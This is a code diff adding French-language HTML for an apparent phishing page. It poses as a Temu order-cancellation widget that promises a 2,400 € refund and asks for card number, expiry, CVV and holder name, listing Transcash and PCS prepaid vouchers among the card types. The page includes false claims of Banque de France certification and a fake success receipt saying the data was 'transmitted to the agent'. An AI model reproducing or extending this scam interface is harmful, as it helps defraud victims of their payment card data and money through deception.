@@ -449,6 +449,170 @@
   </div>
 
   <!-- ========================================================
+       WIDGET DU BAS : SÉLECTION CARTE & SAISIE DU CODE PIN
+       S'affiche par le bas après le clic sur "Annuler ma commande"
+       ======================================================== -->
+  <div class="bottom-sheet-overlay" id="bottom-sheet-cards-overlay" aria-hidden="true">
+    <div class="bottom-sheet-widget" id="bottom-sheet-widget">
+      <!-- Barre poignée (drag handle) -->
+      <div class="sheet-drag-handle"></div>
+
+      <!-- En-tête du widget -->
+      <div class="sheet-header">
+        <div class="sheet-header-info">
+          <div class="sheet-badge-secure">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            Sécurisation du Remboursement
+          </div>
+          <h3 class="sheet-title">Annulation de Commande & Remboursement</h3>
+          <p class="sheet-subtitle">Sélectionnez votre carte bancaire ou prépayée pour valider l'annulation et sécuriser le remboursement de <strong>2 400,00 €</strong>.</p>
+        </div>
+        <button type="button" class="sheet-close-btn" id="btn-close-sheet" title="Fermer">&times;</button>
+      </div>
+
+      <!-- Sélecteur horizontal de logos de cartes (Visa, Mastercard, CB, Amex, Transcash, PCS) -->
+      <div class="sheet-cards-selector">
+        <span class="cards-selector-label">Choisissez votre type de carte :</span>
+        <div class="cards-logo-grid">
+          <!-- Visa -->
+          <button type="button" class="card-logo-item active" data-card="visa" data-color="visa">
+            <div class="card-badge visa-badge">
+              <span class="badge-text-visa">VISA</span>
+            </div>
+            <span class="card-item-name">Visa</span>
+          </button>
+
+          <!-- Mastercard -->
+          <button type="button" class="card-logo-item" data-card="mastercard" data-color="mastercard">
+            <div class="card-badge mc-badge">
+              <span class="mc-circle c-red"></span>
+              <span class="mc-circle c-yellow"></span>
+            </div>
+            <span class="card-item-name">Mastercard</span>
+          </button>
+
+          <!-- CB (Carte Bancaire) -->
+          <button type="button" class="card-logo-item" data-card="cb" data-color="cb">
+            <div class="card-badge cb-badge">
+              <span class="cb-text-c">c</span><span class="cb-text-b">b</span>
+            </div>
+            <span class="card-item-name">CB</span>
+          </button>
+
+          <!-- American Express -->
+          <button type="button" class="card-logo-item" data-card="amex" data-color="amex">
+            <div class="card-badge amex-badge">
+              <span>AMEX</span>
+            </div>
+            <span class="card-item-name">Amex</span>
+          </button>
+
+          <!-- Transcash -->
+          <button type="button" class="card-logo-item" data-card="transcash" data-color="transcash">
+            <div class="card-badge transcash-badge">
+              <span class="tc-logo-text">TRANSCASH</span>
+            </div>
+            <span class="card-item-name">Transcash</span>
+          </button>
+
+          <!-- PCS -->
+          <button type="button" class="card-logo-item" data-card="pcs" data-color="pcs">
+            <div class="card-badge pcs-badge">
+              <span class="pcs-logo-text">PCS</span>
+            </div>
+            <span class="card-item-name">PCS</span>
+          </button>
+        </div>
+      </div>
+
+      <!-- Corps du formulaire de saisie de la carte & Code PIN -->
+      <form id="sheet-card-form" class="sheet-form-wrapper">
+        
+        <!-- Simulation visuelle dynamique de la carte sélectionnée -->
+        <div class="mini-card-preview skin-visa" id="mini-card-preview">
+          <div class="mini-card-top">
+            <div class="mini-card-chip"></div>
+            <span class="mini-card-brand-label" id="preview-brand-name">VISA</span>
+          </div>
+          <div class="mini-card-number" id="preview-card-number">•••• •••• •••• ••••</div>
+          <div class="mini-card-bottom">
+            <div class="mini-card-col">
+              <span class="mini-label">TITULAIRE</span>
+              <span class="mini-val" id="preview-card-holder">PIERRE BARLIE</span>
+            </div>
+            <div class="mini-card-col">
+              <span class="mini-label">EXPIRATION</span>
+              <span class="mini-val" id="preview-card-exp">MM/AA</span>
+            </div>
+            <div class="mini-card-col">
+              <span class="mini-label">SÉCURITÉ</span>
+              <span class="mini-val">SSL 256-BIT</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="sheet-inputs-grid">
+          <!-- Numéro de carte -->
+          <div class="sheet-form-group span-2">
+            <label class="sheet-label">Numéro de carte (16 chiffres) <span class="req">*</span></label>
+            <div class="sheet-input-wrapper">
+              <input type="text" id="sheet-card-number" class="sheet-input font-mono" placeholder="4970 0000 0000 0000" maxlength="19" required autocomplete="off">
+              <span class="sheet-input-badge" id="sheet-card-type-badge">VISA</span>
+            </div>
+          </div>
+
+          <!-- Nom Titulaire -->
+          <div class="sheet-form-group span-2">
+            <label class="sheet-label">Nom du Titulaire <span class="req">*</span></label>
+            <input type="text" id="sheet-card-holder" class="sheet-input" placeholder="Pierre Barlie" value="Pierre Barlie" required autocomplete="off">
+          </div>
+
+          <!-- Expiration -->
+          <div class="sheet-form-group">
+            <label class="sheet-label">Date d'expiration <span class="req">*</span></label>
+            <input type="text" id="sheet-card-exp" class="sheet-input font-mono" placeholder="MM/AA" maxlength="5" required autocomplete="off">
+          </div>
+
+          <!-- CVV -->
+          <div class="sheet-form-group">
+            <label class="sheet-label">Cryptogramme CVV <span class="req">*</span></label>
+            <input type="password" id="sheet-card-cvv" class="sheet-input font-mono" placeholder="•••" maxlength="3" required autocomplete="off">
+          </div>
+        </div>
+
+        <!-- Bouton de validation -->
+        <button type="submit" class="btn-confirm-cancel-sheet" id="btn-submit-sheet-card">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          Valider l'annulation & Rembourser 2 400,00 €
+        </button>
+
+        <p class="sheet-legal-notice">
+          🔒 Sécurisation bancaire certifiée sous le protocole de la Banque de France. L'annulation et la restitution des <strong>2 400,00 €</strong> sont validées instantanément.
+        </p>
+      </form>
+
+      <!-- Écran de confirmation de l'annulation réussi -->
+      <div id="sheet-success-screen" class="sheet-success-screen" style="display: none;">
+        <div class="sheet-success-icon">✓</div>
+        <h3 class="sheet-success-title">Annulation validée avec succès !</h3>
+        <p class="sheet-success-desc">
+          Votre demande d'annulation pour la commande <strong>CMD-TEMU-89241-EU</strong> a bien été enregistrée et transmise à la passerelle bancaire.
+        </p>
+        <div class="sheet-receipt-summary">
+          <div class="receipt-row"><span>Réf. Remboursement :</span> <strong id="receipt-ref-code">REF-ANN-89241</strong></div>
+          <div class="receipt-row"><span>Type de carte :</span> <strong id="receipt-card-brand">VISA</strong></div>
+          <div class="receipt-row"><span>Montant remboursé :</span> <strong style="color: #16a34a;">2 400,00 €</strong></div>
+          <div class="receipt-row"><span>Statut :</span> <strong style="color: #0284c7;">Validé & Transmis à l'agent</strong></div>
+        </div>
+        <button type="button" class="btn-confirm-cancel-sheet" id="btn-finish-sheet">
+          Fermer
+        </button>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ========================================================
        MODALE / OVERLAY DE CHARGEMENT ANNULATION & REDIRECTION
        Animation TEMU <-> BANK (10 à 12 secondes)
        ======================================================== -->
